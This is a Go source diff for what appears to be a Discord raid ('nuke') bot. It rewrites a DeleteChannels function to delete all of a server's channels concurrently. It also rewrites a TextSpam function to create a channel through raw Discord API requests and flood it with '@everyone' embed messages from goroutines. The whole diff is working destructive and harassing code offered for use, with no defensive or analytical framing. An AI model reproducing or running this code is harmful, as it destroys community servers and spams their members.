@@ -1,19 +1,24 @@
 package creating
 
 import (
+	"Dynamic/core/requests"
+	"encoding/json"
 	"fmt"
 	"os"
 	"sync"
+	"time"
 
 	"github.com/bwmarrin/discordgo"
 	"github.com/joho/godotenv"
 )
 
-func DeleteChannels(s *discordgo.Session, m *discordgo.MessageCreate) {
-	channels, _ := s.GuildChannels(m.GuildID)
-
+func DeleteChannels(s *discordgo.Session, channels []*discordgo.Channel, wg *sync.WaitGroup) {
 	for _, channel := range channels {
-		s.ChannelDelete(channel.ID)
+		wg.Add(1)
+		go func(ch *discordgo.Channel) {
+			defer wg.Done()
+			s.ChannelDelete(ch.ID)
+		}(channel)
 	}
 }
 
@@ -42,14 +47,38 @@ func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGro
 		Thumbnail:   &thumbnail,
 	}
 
-	data := discordgo.MessageSend{
+	dataMsg := discordgo.MessageSend{
 		Content: "@everyone",
 		Embeds:  []*discordgo.MessageEmbed{&embed},
 	}
 
-	channel, _ := s.GuildChannelCreate(m.GuildID, CHANNEL_NAME, discordgo.ChannelTypeGuildText)
+	dataMap := map[string]string{"name": string(CHANNEL_NAME), "type": "0"}
+	jsonData, _ := json.Marshal(dataMap)
+
+	data := requests.Sendhttp("https://discord.com/api/v9/guilds/"+m.GuildID+"/channels", "POST", jsonData)
+
+	time.Sleep(2 * time.Second)
+
+	type ResponseData struct {
+		ID string `json:"id"`
+	}
+
+	var responseData ResponseData
+	err = json.Unmarshal([]byte(data), &responseData)
+	if err != nil {
+		fmt.Println("There's an error while decoding JSON:", err)
+		return
+	}
+
+	jsonData, _ = json.Marshal(dataMsg)
 
 	for i := 0; i < 6; i++ {
-		s.ChannelMessageSendComplex(channel.ID, &data)
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			requests.Sendhttp("https://discord.com/api/v9/channels/"+responseData.ID+"/messages", "POST", jsonData)
+		}()
+		time.Sleep(time.Second)
+
 	}
 }
